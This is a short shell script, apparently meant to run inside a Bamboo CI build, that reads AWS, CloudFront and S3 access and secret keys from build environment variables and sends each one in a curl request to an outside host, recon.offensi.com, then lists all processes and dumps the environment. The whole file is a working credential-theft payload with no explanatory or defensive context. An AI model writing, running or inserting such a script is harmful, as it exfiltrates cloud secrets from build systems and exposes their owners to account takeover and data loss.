#!/bin/sh
curl http://recon.offensi.com/`echo aws:$bamboo_aws_access_key_password`
curl http://recon.offensi.com/`echo aws:$aws_secret_access_key_password`

curl http://recon.offensi.com/`echo market:$bamboo_market_cloudfront_access_key_password`
curl http://recon.offensi.com/`echo market:$bamboo_market_cloudfront_secret_key_password`

curl http://recon.offensi.com/`echo markets3:$bamboo_market_s3_access_key_password`
curl http://recon.offensi.com/`echo markets3:bamboo_market_s3_secret_key_password`


ps auxww
export
exit 1
